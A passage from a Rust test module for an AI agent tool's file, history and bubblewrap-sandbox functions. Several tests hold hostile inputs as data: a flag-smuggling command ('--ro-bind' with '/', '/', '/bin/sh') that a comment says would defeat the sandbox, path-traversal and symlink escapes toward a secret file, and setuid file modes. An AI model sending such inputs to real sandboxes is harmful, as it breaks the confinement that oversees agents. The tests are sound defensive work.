        assert!(deleted.contains("\"deleted\":true"), "{deleted}");
        assert_eq!(
            call(tool_kb_read, &ctx, serde_json::json!({"id": id})),
            "No such note."
        );
    }

    #[test]
    fn test_plan_tools_round_trip_through_db() {
        let ctx = plan_test_ctx();
        let update = r#"{"items": [
            {"content": "read code", "status": "completed"},
            {"content": "write fix", "status": "in_progress"}
        ]}"#;
        tool_plan_update(&update.to_string(), &ctx).unwrap();

        let got: serde_json::Value =
            serde_json::from_str(&tool_plan_get(&"{}".to_string(), &ctx).unwrap()).unwrap();
        assert_eq!(got["items"][1]["content"], "write fix");
        assert_eq!(got["items"][1]["status"], "in_progress");
    }

    #[test]
    fn test_plan_update_clears_finished_plan() {
        let ctx = plan_test_ctx();
        let update = r#"{"items": [{"content": "a", "status": "pending"}]}"#;
        tool_plan_update(&update.to_string(), &ctx).unwrap();
        let done = r#"{"items": [{"content": "a", "status": "completed"}]}"#;
        tool_plan_update(&done.to_string(), &ctx).unwrap();
        let db = ctx.db().unwrap();
        assert_eq!(db.get_agent_data("default", PLAN_DATA_KEY).unwrap(), None);
    }

    #[test]
    fn test_plan_update_rejects_invalid_plan_without_saving() {
        let ctx = plan_test_ctx();
        let bad = r#"{"items": [
            {"content": "a", "status": "in_progress"},
            {"content": "b", "status": "in_progress"}
        ]}"#;
        assert!(tool_plan_update(&bad.to_string(), &ctx).is_err());
        assert!(load_plan(ctx.db().unwrap(), "default").unwrap().is_empty());
    }

    #[test]
    fn test_deleting_agent_deletes_its_plan() {
        let mut ctx = plan_test_ctx();
        let db = ctx.db.clone().unwrap();
        db.create_agent("sub", "Sub-agent: sub").unwrap();
        ctx.agent_name = Some("sub".to_string());
        let update = r#"{"items": [{"content": "a", "status": "pending"}]}"#;
        tool_plan_update(&update.to_string(), &ctx).unwrap();
        assert_eq!(load_plan(db.as_ref(), "sub").unwrap().len(), 1);

        assert!(db.delete_agent("sub").unwrap());
        assert_eq!(db.get_agent_data("sub", PLAN_DATA_KEY).unwrap(), None);
    }

    #[test]
    fn test_plan_tools_require_agent_identity() {
        let mut ctx = plan_test_ctx();
        ctx.agent_name = None;
        assert!(tool_plan_get(&"{}".to_string(), &ctx).is_err());
    }

    #[test]
    fn test_db_history_add_and_get() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.add("first").unwrap();
        hist.add("second").unwrap();
        let result = hist.get(0, SearchDirection::Forward).unwrap().unwrap();
        assert_eq!(result.entry.as_ref(), "first");
        let result = hist.get(1, SearchDirection::Forward).unwrap().unwrap();
        assert_eq!(result.entry.as_ref(), "second");
    }

    #[test]
    fn test_db_history_len() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        assert_eq!(hist.len(), 0);
        assert!(hist.is_empty());
        hist.add("first").unwrap();
        assert_eq!(hist.len(), 1);
        assert!(!hist.is_empty());
    }

    #[test]
    fn test_db_history_ignore_empty() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.add("").unwrap();
        assert_eq!(hist.len(), 0);
    }

    #[test]
    fn test_db_history_ignore_space() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.ignore_space(true);
        hist.add(" hidden").unwrap();
        assert_eq!(hist.len(), 0);
    }

    #[test]
    fn test_db_history_ignore_dups() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.add("same").unwrap();
        hist.add("same").unwrap();
        assert_eq!(hist.len(), 1);
    }

    #[test]
    fn test_db_history_search() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.add("cargo build").unwrap();
        hist.add("cargo test").unwrap();
        hist.add("git status").unwrap();

        let result = hist
            .search("cargo", 0, SearchDirection::Forward)
            .unwrap()
            .unwrap();
        assert_eq!(result.entry.as_ref(), "cargo build");

        let result = hist
            .search("cargo", 2, SearchDirection::Reverse)
            .unwrap()
            .unwrap();
        assert_eq!(result.entry.as_ref(), "cargo test");
    }

    #[test]
    fn test_db_history_search_with_wildcards() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.add("test_file").unwrap();
        hist.add("testXfile").unwrap();

        let result = hist
            .search("test_file", 0, SearchDirection::Forward)
            .unwrap()
            .unwrap();
        assert_eq!(result.entry.as_ref(), "test_file");
    }

    #[test]
    fn test_db_history_starts_with() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.add("cargo build").unwrap();
        hist.add("cargo test").unwrap();
        hist.add("git status").unwrap();

        let result = hist
            .starts_with("cargo", 0, SearchDirection::Forward)
            .unwrap()
            .unwrap();
        assert_eq!(result.entry.as_ref(), "cargo build");

        let result = hist
            .starts_with("git", 0, SearchDirection::Forward)
            .unwrap()
            .unwrap();
        assert_eq!(result.entry.as_ref(), "git status");
    }

    #[test]
    fn test_db_history_starts_with_wildcard_in_term() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.add("100% done").unwrap();
        hist.add("something else").unwrap();

        let result = hist
            .starts_with("100%", 0, SearchDirection::Forward)
            .unwrap()
            .unwrap();
        assert_eq!(result.entry.as_ref(), "100% done");
    }

    #[test]
    fn test_db_history_clear() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.add("first").unwrap();
        hist.add("second").unwrap();
        hist.clear().unwrap();
        assert_eq!(hist.len(), 0);
    }

    #[test]
    fn test_db_history_max_len() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.set_max_len(3).unwrap();
        for i in 0..5 {
            hist.add(&format!("entry{}", i)).unwrap();
        }
        assert_eq!(hist.len(), 3);
    }

    #[test]
    fn test_db_history_reverse_get() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.add("first").unwrap();
        hist.add("second").unwrap();
        hist.add("third").unwrap();

        let result = hist.get(2, SearchDirection::Reverse).unwrap().unwrap();
        assert_eq!(result.entry.as_ref(), "third");
    }

    #[test]
    fn test_db_history_mem_fallback() {
        let mut hist = DbHistory::new(None);
        hist.add("memory only").unwrap();
        assert_eq!(hist.len(), 1);
        let result = hist.get(0, SearchDirection::Forward).unwrap().unwrap();
        assert_eq!(result.entry.as_ref(), "memory only");
    }

    #[test]
    fn test_db_history_search_not_found() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.add("hello").unwrap();
        let result = hist
            .search("nonexistent", 0, SearchDirection::Forward)
            .unwrap();
        assert!(result.is_none());
    }

    #[test]
    fn test_db_history_search_empty_term() {
        let conn = test_db_conn();
        let mut hist = DbHistory::new(Some(conn));
        hist.add("hello").unwrap();
        let result = hist.search("", 0, SearchDirection::Forward).unwrap();
        assert!(result.is_none());
    }

    #[test]
    fn test_format_tool_output_json() {
        let output = r#"{"stdout":"hello\n","stderr":"","exit_code":0,"success":true}"#;
        let result = format_tool_output(output);
        assert_eq!(result, "hello");
    }

    #[test]
    fn test_format_tool_output_json_with_stderr() {
        let output = r#"{"stdout":"out","stderr":"err","exit_code":1,"success":false}"#;
        let result = format_tool_output(output);
        assert!(result.contains("out"));
        assert!(result.contains("stderr: err"));
    }

    #[test]
    fn test_format_tool_output_plain_text() {
        let result = format_tool_output("just plain text");
        assert_eq!(result, "just plain text");
    }

    #[test]
    fn test_bwrap_args_direct_command_with_explicit_args() {
        let args = bwrap_args(
            "/home/user/project",
            "/usr/bin/ls",
            Some(&["-l".to_string(), "-a".to_string()]),
        );
        // Same sandboxing flags every time, ending with the command run
        // directly (no shell) - matching the given bwrap invocation, with
        // $(pwd) substituted for the actual working directory.
        assert_eq!(
            args,
            vec![
                "--cap-drop",
                "ALL",
                "--clearenv",
                "--unshare-net",
                "--unshare-pid",
                "--unshare-ipc",
                "--unshare-uts",
                "--unshare-cgroup-try",
                "--die-with-parent",
                "--new-session",
                "--dev",
                "/dev/",
                "--proc",
                "/proc",
                "--tmpfs",
                "/",
                "--ro-bind",
                "/usr",
                "/usr",
                "--ro-bind-try",
                "/lib",
                "/lib",
                "--ro-bind-try",
                "/lib64",
                "/lib64",
                "--bind",
                "/home/user/project",
                "/home/user/project",
                "--",
                "/usr/bin/ls",
                "-l",
                "-a",
            ]
        );
    }

    #[test]
    fn test_bwrap_args_single_word_command_with_no_args_runs_directly() {
        let args = bwrap_args("/cwd", "/usr/bin/ls", None);
        assert_eq!(args.last(), Some(&"/usr/bin/ls".to_string()));
        assert!(!args.contains(&"/usr/bin/bash".to_string()));
    }

    #[test]
    fn test_bwrap_args_multiword_command_with_no_args_uses_bash_c() {
        // Same fallback convention as the unsandboxed path: a multi-word
        // command string with no explicit args runs as a shell command,
        // using the sandbox's own /usr/bin/bash rather than relying on a
        // possibly-absent /bin/sh or an unset $PATH (--clearenv wipes it).
        let args = bwrap_args("/cwd", "ls -la /tmp", None);
        let tail = &args[args.len() - 3..];
        assert_eq!(
            tail,
            &[
                "/usr/bin/bash".to_string(),
                "-c".to_string(),
                "ls -la /tmp".to_string()
            ]
        );
    }

    #[test]
    fn test_bwrap_args_separates_sandbox_flags_from_the_command_with_dashdash() {
        // command/args come straight from the model's tool call, unvalidated
        // at this layer - without "--", a command crafted to look like a
        // bwrap flag (e.g. "--ro-bind" with args ["/", "/", ...]) would be
        // parsed by bwrap as one of ITS OWN options rather than the command
        // to run, e.g. re-binding the whole host root back over the
        // "--tmpfs /" above and defeating the sandbox entirely.
        let args = bwrap_args(
            "/cwd",
            "--ro-bind",
            Some(&["/".to_string(), "/".to_string(), "/bin/sh".to_string()]),
        );
        let dashdash = args.iter().position(|a| a == "--").expect("no -- found");
        // Everything from "--" onward is opaque command/args to bwrap, no
        // matter what it looks like.
        assert_eq!(&args[dashdash + 1], "--ro-bind");
        assert_eq!(&args[dashdash + 2..], ["/", "/", "/bin/sh"]);
        // And "--" must come strictly after every fixed sandbox flag, not
        // interleaved with them.
        let bind_pos = args.iter().position(|a| a == "--bind").unwrap();
        assert!(dashdash > bind_pos + 2);
    }

    #[test]
    fn test_run_command_sandboxed_rejects_flag_like_command() {
        // A bare name is looked up on PATH and only ever passed on as the
        // resulting absolute path - something that looks like a bwrap flag
        // (e.g. "--ro-bind") isn't found and never gets near bwrap's argv.
        let params = serde_json::json!({
            "command": "--ro-bind",
            "args": ["/", "/", "/bin/sh"]
        });
        let result = tool_run_command_sandboxed(&params.to_string(), &test_ctx()).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();
        assert_eq!(parsed["success"], false);
        assert!(
            parsed["stderr"]
                .as_str()
                .unwrap()
                .contains("not found on PATH")
        );
    }

    #[test]
    fn test_resolve_sandboxed_command_keeps_absolute_path() {
        let cwd = std::path::Path::new("/work");
        assert_eq!(
            resolve_sandboxed_command("/usr/bin/ls", cwd, None).unwrap(),
            "/usr/bin/ls"
        );
    }

    #[test]
    fn test_resolve_sandboxed_command_joins_relative_path_to_cwd() {
        let cwd = std::path::Path::new("/work");
        assert_eq!(
            resolve_sandboxed_command("./build.sh", cwd, None).unwrap(),
            "/work/build.sh"
        );
        assert_eq!(
            resolve_sandboxed_command("target/debug/../release/app", cwd, None).unwrap(),
            "/work/target/release/app"
        );
    }

    #[test]
    fn test_resolve_sandboxed_command_rejects_relative_path_escaping_cwd() {
        let cwd = std::path::Path::new("/work/project");
        let err = resolve_sandboxed_command("../other/script.sh", cwd, None).unwrap_err();
        assert!(err.contains("isn't visible inside the sandbox"), "{err}");
    }

    #[test]
    fn test_resolve_sandboxed_command_looks_up_bare_name_on_path() {
        let dir = std::env::temp_dir().join(format!("faber_test_path_{}", std::process::id()));
        let bin = dir.join("bin");
        fs::create_dir_all(&bin).unwrap();
        fs::write(bin.join("mytool"), "").unwrap();
        let path_dirs = std::ffi::OsString::from(format!("/nonexistent:{}", bin.display()));

        // Found on PATH and under cwd, so visible in the sandbox.
        let resolved = resolve_sandboxed_command("mytool", &dir, Some(&path_dirs)).unwrap();
        assert_eq!(
            resolved,
            fs::canonicalize(&bin)
                .unwrap()
                .join("mytool")
                .to_str()
                .unwrap()
        );

        // Found on PATH but outside every directory the sandbox can see.
        let err =
            resolve_sandboxed_command("mytool", std::path::Path::new("/work"), Some(&path_dirs))
                .unwrap_err();
        assert!(err.contains("isn't visible inside the sandbox"), "{err}");

        let err = resolve_sandboxed_command("nosuchtool", &dir, Some(&path_dirs)).unwrap_err();
        assert!(err.contains("not found on PATH"), "{err}");

        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_command_spawn_error_message_mentions_bwrap_when_sandboxed() {
        let err = std::io::Error::new(std::io::ErrorKind::NotFound, "No such file or directory");
        let msg = command_spawn_error_message(true, &err);
        assert!(msg.contains("bwrap"), "{msg:?}");
        assert!(msg.contains("bubblewrap"), "{msg:?}");
    }

    #[test]
    fn test_command_spawn_error_message_plain_when_not_sandboxed() {
        let err = std::io::Error::new(std::io::ErrorKind::NotFound, "No such file or directory");
        let msg = command_spawn_error_message(false, &err);
        assert!(!msg.contains("bwrap"), "{msg:?}");
        assert_eq!(msg, "Failed to execute command: No such file or directory");
    }

    #[test]
    fn test_bwrap_args_binds_cwd_read_write_and_system_dirs_read_only() {
        let args = bwrap_args("/some/dir", "/usr/bin/true", None);
        let bind_pos = args.iter().position(|a| a == "--bind").unwrap();
        assert_eq!(args[bind_pos + 1], "/some/dir");
        assert_eq!(args[bind_pos + 2], "/some/dir");
        assert!(args.contains(&"--ro-bind".to_string()));
        assert!(args.contains(&"--unshare-net".to_string()));
        assert!(args.contains(&"--clearenv".to_string()));
    }

    #[test]
    fn test_bwrap_args_binds_lib_and_lib64_only_if_they_exist() {
        // /usr is a hard requirement (--ro-bind: fail loudly if missing,
        // which would be a very unusual system anyway); /lib and /lib64
        // don't exist on every system (which one, if either, varies by
        // architecture and distro), so both are bound with -try instead -
        // skipped silently by bwrap rather than refusing to launch the
        // sandbox at all over one that isn't there.
        let args = bwrap_args("/some/dir", "/usr/bin/true", None);
        for lib_dir in ["/lib", "/lib64"] {
            let pos = args
                .iter()
                .position(|a| a == lib_dir)
                .unwrap_or_else(|| panic!("{lib_dir} not found in {args:?}"));
            assert_eq!(args[pos - 1], "--ro-bind-try");
        }

        let usr_pos = args.iter().position(|a| a == "/usr").unwrap();
        assert_eq!(args[usr_pos - 1], "--ro-bind");
    }

    #[test]
    fn test_bwrap_args_isolates_every_other_namespace_and_hardens_the_process() {
        let args = bwrap_args("/some/dir", "/usr/bin/true", None);
        for flag in [
            "--unshare-pid", // no visibility into (or signaling of) host processes via /proc
            "--unshare-ipc", // no access to the host's System V/POSIX IPC objects
            "--unshare-uts", // no access to the host's hostname/domainname
            "--unshare-cgroup-try", // isolates the cgroup namespace where the kernel supports it
            "--die-with-parent", // killed if faber itself dies, instead of lingering
            "--new-session", // detached from the controlling terminal (blocks TIOCSTI injection)
        ] {
            assert!(args.contains(&flag.to_string()), "missing {flag}: {args:?}");
        }
        // All isolation flags must come before "--", i.e. be bwrap's own
        // options, never mistaken for (or overridden by) the command/args.
        let dashdash = args.iter().position(|a| a == "--").unwrap();
        assert!(args[..dashdash].contains(&"--unshare-pid".to_string()));
    }

    #[test]
    fn test_initialize_chat_messages_has_no_default_system_prompts() {
        // No hardcoded system message should be injected into a new chat,
        // with or without tools available - only what the user explicitly
        // adds (via /system, a per-agent config, or files passed to
        // `prompt`) should ever show up as a system message.
        let opts = Opts::default();
        assert!(initialize_chat_messages(&ToolsCollection::new(), &opts).is_empty());

        let mut tools = ToolsCollection::new();
        tools.insert(
            "read_file".to_string(),
            ToolItem {
                callback: tool_read_file,
                schema: "{}".to_string(),
            },
        );
        assert!(initialize_chat_messages(&tools, &opts).is_empty());
    }

    #[test]
    fn test_initialize_tools_safe() {
        let tools = initialize_tools(false, None);
        assert!(tools.contains_key("read_file"));
        assert!(tools.contains_key("write_file"));
        // run_command is still available without --unsafe-tools, but
        // sandboxed - and the model is told so, via the schema description
        // it's given (checked here rather than comparing the callback
        // function pointer directly, which isn't a reliable equality check).
        assert!(tools.contains_key("run_command"));
        assert!(tools["run_command"].schema.contains("sandbox"));
        assert!(!tools.contains_key("fetch_web_content"));
    }

    #[test]
    fn test_initialize_tools_unsafe() {
        let tools = initialize_tools(true, None);
        assert!(tools.contains_key("read_file"));
        assert!(tools.contains_key("run_command"));
        assert!(!tools["run_command"].schema.contains("sandbox"));
        assert!(tools.contains_key("fetch_web_content"));
    }

    #[test]
    fn test_initialize_tools_allowed_filter() {
        let allowed = vec!["read_file".to_string(), "write_file".to_string()];
        let tools = initialize_tools(true, Some(&allowed));
        assert!(tools.contains_key("read_file"));
        assert!(tools.contains_key("write_file"));
        assert!(!tools.contains_key("run_command"));
        assert!(!tools.contains_key("glob"));
    }

    /// Patches `path` as an agent that has just read it.
    fn patch(path: &str, edits: serde_json::Value) -> Result<serde_json::Value, Box<dyn Error>> {
        let ctx = test_ctx();
        let _ = tool_read_file(&serde_json::json!({ "path": path }).to_string(), &ctx);
        let params = serde_json::json!({ "path": path, "edits": edits });
        tool_patch_file(&params.to_string(), &ctx).map(|r| serde_json::from_str(&r).unwrap())
    }

    #[test]
    fn test_patch_file_registered_as_safe_tool() {
        let tools = initialize_tools(false, None);
        assert!(tools.contains_key("patch_file"));
    }

    #[test]
    fn test_patch_file_multiple_edits() {
        let path = "_test_pf_multi.tmp";
        write_test_file(path, "one\ntwo\nthree\n");
        let res = patch(
            path,
            serde_json::json!([
                {"old_content": "one", "new_content": "1"},
                {"old_content": "three", "new_content": "THREE!"}
            ]),
        )
        .unwrap();
        assert_eq!(res["edits_applied"], 2);
        assert_eq!(res["replacements"], 2);
        assert_eq!(read_test_file(path), "1\ntwo\nTHREE!\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_edits_apply_in_order() {
        let path = "_test_pf_order.tmp";
        write_test_file(path, "alpha\n");
        patch(
            path,
            serde_json::json!([
                {"old_content": "alpha", "new_content": "beta"},
                {"old_content": "beta", "new_content": "gamma"}
            ]),
        )
        .unwrap();
        assert_eq!(read_test_file(path), "gamma\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_is_atomic() {
        let path = "_test_pf_atomic.tmp";
        write_test_file(path, "keep me\nchange me\n");
        let err = patch(
            path,
            serde_json::json!([
                {"old_content": "change me", "new_content": "changed"},
                {"old_content": "missing", "new_content": "x"}
            ]),
        )
        .unwrap_err();
        assert!(err.to_string().contains("edit 2"));
        assert_eq!(read_test_file(path), "keep me\nchange me\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_ambiguous_match() {
        let path = "_test_pf_ambiguous.tmp";
        write_test_file(path, "aa bb aa\n");
        let err = patch(
            path,
            serde_json::json!([{"old_content": "aa", "new_content": "x"}]),
        )
        .unwrap_err();
        assert!(err.to_string().contains("multiple times"));
        assert_eq!(read_test_file(path), "aa bb aa\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_overlapping_match_is_ambiguous() {
        let path = "_test_pf_overlap.tmp";
        write_test_file(path, "aaa\n");
        assert!(
            patch(
                path,
                serde_json::json!([{"old_content": "aa", "new_content": "x"}])
            )
            .is_err()
        );
        cleanup(path);
    }

    #[test]
    fn test_patch_file_replace_all() {
        let path = "_test_pf_all.tmp";
        write_test_file(path, "aa bb aa cc aa\n");
        let res = patch(
            path,
            serde_json::json!([{"old_content": "aa", "new_content": "X", "replace_all": true}]),
        )
        .unwrap();
        assert_eq!(res["replacements"], 3);
        assert_eq!(read_test_file(path), "X bb X cc X\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_shrinks_and_grows() {
        let path = "_test_pf_resize.tmp";
        write_test_file(path, "head\nmiddle part\ntail\n");
        let res = patch(
            path,
            serde_json::json!([{"old_content": "middle part\n", "new_content": ""}]),
        )
        .unwrap();
        assert_eq!(res["bytes_after"], 10);
        assert_eq!(read_test_file(path), "head\ntail\n");
        patch(
            path,
            serde_json::json!([{"old_content": "head\n", "new_content": "a much longer head\n"}]),
        )
        .unwrap();
        assert_eq!(read_test_file(path), "a much longer head\ntail\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_writes_only_changed_bytes() {
        let path = "_test_pf_minimal.tmp";
        write_test_file(path, "prefix XXXX suffix\n");
        let res = patch(
            path,
            serde_json::json!([{"old_content": "XXXX", "new_content": "YYYY"}]),
        )
        .unwrap();
        assert_eq!(res["bytes_written"], 4);
        assert_eq!(read_test_file(path), "prefix YYYY suffix\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_preserves_mode() {
        use std::os::unix::fs::PermissionsExt;
        let path = "_test_pf_mode.tmp";
        write_test_file(path, "#!/bin/sh\necho hi\n");
        std::fs::set_permissions(
            test_dir().join(path),
            std::fs::Permissions::from_mode(0o755),
        )
        .unwrap();
        patch(
            path,
            serde_json::json!([{"old_content": "hi", "new_content": "ho"}]),
        )
        .unwrap();
        let mode = std::fs::metadata(test_dir().join(path))
            .unwrap()
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(mode, 0o755);
        cleanup(path);
    }

    #[test]
    fn test_patch_file_unicode() {
        let path = "_test_pf_unicode.tmp";
        write_test_file(path, "héllo wörld\n");
        patch(
            path,
            serde_json::json!([{"old_content": "wörld", "new_content": "monde"}]),
        )
        .unwrap();
        assert_eq!(read_test_file(path), "héllo monde\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_rejects_bad_input() {
        let path = "_test_pf_bad.tmp";
        write_test_file(path, "content\n");
        assert!(patch(path, serde_json::json!([])).is_err());
        assert!(
            patch(
                path,
                serde_json::json!([{"old_content": "", "new_content": "x"}])
            )
            .is_err()
        );
        assert!(
            patch(
                path,
                serde_json::json!([{"old_content": "content", "new_content": "content"}])
            )
            .is_err()
        );
        let missing_err = patch(
            "_test_pf_missing.tmp",
            serde_json::json!([{"old_content": "a", "new_content": "b"}]),
        )
        .unwrap_err();
        // The underlying OS reason, not just pathrs's generic wrapper
        // message ("openat2 one-shot open failed"), must come through.
        assert!(
            missing_err
                .to_string()
                .contains("No such file or directory"),
            "error message dropped the underlying cause: {}",
            missing_err
        );
        assert_eq!(read_test_file(path), "content\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_rejects_invalid_utf8_and_directories() {
        let path = "_test_pf_binary.tmp";
        std::fs::write(test_dir().join(path), [0xff, 0xfe, b'a']).unwrap();
        assert!(
            patch(
                path,
                serde_json::json!([{"old_content": "a", "new_content": "b"}])
            )
            .is_err()
        );
        cleanup(path);
        assert!(
            patch(
                "src",
                serde_json::json!([{"old_content": "a", "new_content": "b"}])
            )
            .is_err()
        );
    }

    #[test]
    fn test_patch_file_cannot_escape_the_root() {
        let outside = "../_test_pf_outside.tmp";
        std::fs::write(outside, "outside\n").unwrap();
        let res = patch(
            outside,
            serde_json::json!([{"old_content": "outside", "new_content": "hacked"}]),
        );
        assert_eq!(std::fs::read_to_string(outside).unwrap(), "outside\n");
        assert!(res.is_err());
        let _ = std::fs::remove_file(outside);
    }

    #[test]
    fn test_every_tool_schema_is_valid_json_naming_its_tool() {
        for unsafe_tools in [false, true] {
            for (name, tool) in initialize_tools(unsafe_tools, None) {
                let schema: serde_json::Value = serde_json::from_str(&tool.schema)
                    .unwrap_or_else(|e| panic!("schema of {name} is invalid JSON: {e}"));
                assert_eq!(schema["function"]["name"], name.as_str());
            }
        }
    }

    fn search_params(json: serde_json::Value) -> SearchParams {
        serde_json::from_value(json).unwrap()
    }

    #[test]
    fn test_handed_off_files_are_read_where_the_agent_works() {
        let dir = TempTestDir::new("handoff_files");
        std::fs::create_dir_all(dir.0.join("w")).unwrap();
        std::fs::write(dir.0.join("secret"), "TOPSECRET\n").unwrap();
        std::fs::write(dir.0.join("w/notes.md"), "the plan\n").unwrap();
        std::os::unix::fs::symlink(dir.0.join("secret"), dir.0.join("w/k")).unwrap();
        let mut ctx = test_ctx();
        ctx.cwd = Some(dir.0.join("w"));
        let hand = |file: &str| {
            handoff_message(
                &ctx,
                &Handoff {
                    notes: Vec::new(),
                    files: vec![file.to_string()],
                },
            )
        };
        let message = hand("notes.md").unwrap().unwrap();
        assert!(message.content.unwrap().contains("the plan"));
        for out in ["k", "../secret", dir.0.join("secret").to_str().unwrap()] {
            assert!(hand(out).is_err(), "{out}");
        }
    }

    #[test]
    fn test_file_tools_refuse_what_isnt_a_file_and_keep_modes_tame() {
        use std::os::unix::fs::PermissionsExt;
        let dir = TempTestDir::new("file_tool_limits");
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.cwd = Some(dir.0.clone());
        ctx.file_versions = None;
        let call = |f: ToolCallback, params: serde_json::Value| f(&params.to_string(), &ctx);
        // Paths naming no file: refused, not a crash.
        for path in ["", "/", "//", "sub/.."] {
            assert!(
                call(tool_delete_path, serde_json::json!({"path": path})).is_err(),
                "{path:?}"
            );
            assert!(
                call(
                    tool_write_file,
                    serde_json::json!({"path": path, "content": "x"})
                )
                .is_err(),
                "{path:?}"
            );
        }
        // A FIFO is refused at once, rather than blocking forever.
        assert!(
            std::process::Command::new("mkfifo")
                .arg(dir.0.join("pipe"))
                .status()
                .unwrap()
                .success()
        );
        let read = call(tool_read_file, serde_json::json!({"path": "pipe"})).unwrap();
        assert!(read.contains("regular file"), "{read}");
        assert!(
            call(
                tool_write_file,
                serde_json::json!({"path": "pipe", "content": "x"})
            )
            .is_err()
        );
        // Too large to read whole: refused before it's read.
        let big = std::fs::File::create(dir.0.join("big")).unwrap();
        big.set_len(MAX_FILE_BYTES + 1).unwrap();
        let read = call(tool_read_file, serde_json::json!({"path": "big"})).unwrap();
        assert!(read.contains("too large"), "{read}");
        // Only permission bits, and never writable by everyone.
        call(
            tool_write_file,
            serde_json::json!({"path": "f", "content": "x", "mode": "06777"}),
        )
        .unwrap();
        call(
            tool_write_file,
            serde_json::json!({"path": "f", "content": "y", "mode": "06777"}),
        )
        .unwrap();
        let mode = std::fs::metadata(dir.0.join("f"))
            .unwrap()
            .permissions()
            .mode()
            & 0o7777;
        assert_eq!(mode & 0o7002, 0, "{mode:o}");
    }

    #[test]
    fn test_glob_lists_nothing_through_a_symlink_out() {
        let dir = TempTestDir::new("glob_leak");
        std::fs::create_dir_all(dir.0.join("outside/sub")).unwrap();
        std::os::unix::fs::symlink("/nowhere", dir.0.join("outside/sub/dangling")).unwrap();
        std::fs::create_dir_all(dir.0.join("w")).unwrap();
        std::os::unix::fs::symlink(dir.0.join("outside"), dir.0.join("w/out")).unwrap();
        std::os::unix::fs::symlink("missing", dir.0.join("w/mine")).unwrap();
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.cwd = Some(dir.0.join("w"));
        let found = tool_glob(&r#"{"pattern": "**/*"}"#.to_string(), &ctx).unwrap();
        assert!(
            !found.contains("dangling") && !found.contains("sub"),
            "{found}"
        );
        // A dangling symlink inside is still listed.
        assert!(found.contains("mine"), "{found}");
    }

    #[test]
    fn test_a_crashing_tool_fails_its_call_only() {
        fn crash(_: &String, _: &ToolContext) -> Result<String, Box<dyn Error>> {
            panic!("boom")
        }
        let mut tools = ToolsCollection::new();
        append_tool(&mut tools, "crash".to_string(), crash, "{}".to_string());
        let call = ToolCall {
            index: None,
            id: "1".to_string(),
            tool_type: "function".to_string(),
            function: FunctionCall {
                name: "crash".to_string(),
                arguments: "{}".to_string(),
            },
        };
        let message = tool_call(&tools, &call, &ToolContext::new(|_: &str| {})).unwrap();
        assert!(message.content.unwrap().contains("crashed (boom)"));
    }

    #[test]
    fn test_server_keys_stay_on_this_machine() {
        assert!(server::keys_match("abc", "abc"));
        assert!(!server::keys_match("abd", "abc"));
        assert!(!server::keys_match("ab", "abc"));
        assert!(!server::keys_match("abcd", "abc"));
        assert!(!server::keys_match("", "abc"));
        for local in [
            "127.0.0.1:9090",
            "localhost:1",
            "[::1]:9090",
            "127.1.2.3:80",
        ] {
            assert!(is_loopback_address(local), "{local}");
        }
        for remote in [
            "10.0.0.1:9090",
            "0.0.0.0:9090",
            "faber-host:9090",
            "[::]:9090",
        ] {
            assert!(!is_loopback_address(remote), "{remote}");
        }
        let path = server_key_path("127.0.0.1:9090").unwrap();
        assert!(path.ends_with("faber/serve-9090.key"), "{}", path.display());
        assert!(server_key_path("no-port").is_none());
    }

    #[test]
    fn test_no_agent_works_where_faber_keeps_its_files() {
        let dir = TempTestDir::new("faber_files");
        std::fs::create_dir_all(dir.0.join("proj/sub")).unwrap();
        std::fs::create_dir_all(dir.0.join("data")).unwrap();
        let files = [
            ("database", dir.0.join("data/faber.db")),
            ("config file", dir.0.join("proj/config.json")),
        ];
        assert!(faber_files_outside(&dir.0.join("proj/sub"), &files).is_ok());
        let err = faber_files_outside(&dir.0.join("proj"), &files).unwrap_err();
        assert!(
            err.contains("config file") && err.contains("unsafe tools"),
            "{err}"
        );
        // A parent of it, or the root, holds it too.
        assert!(faber_files_outside(&dir.0, &files).is_err());
        assert!(faber_files_outside(std::path::Path::new("/"), &files).is_err());
        assert!(
            faber_files_outside(&dir.0.join("data"), &files)
                .unwrap_err()
                .contains("database")
        );
    }

    #[test]
    fn test_grep_takes_several_paths_counts_and_multiline() {
        let p = search_params(serde_json::json!({
            "pattern": "x", "count": true, "multiline": true
        }));
        let args = rg_search_args(&p, &["src".to_string(), "/abs/lib.rs".to_string()]);
        assert!(args.contains(&"--count".to_string()));
        assert!(args.contains(&"-U".to_string()));
        // The paths, as given - confinement is the sandbox's - after "--".
        let dash = args.iter().position(|a| a == "--").unwrap();
        assert_eq!(&args[dash + 1..], ["src", "/abs/lib.rs"]);
        let grep = grep_search_args(&p, &["src".to_string()]);
        assert!(grep.contains(&"-c".to_string()));

        let dir = TempTestDir::new("grep_count");
        std::fs::write(dir.0.join("a.txt"), "x\nx\ny\n").unwrap();
        std::fs::write(dir.0.join("b.txt"), "y\n").unwrap();
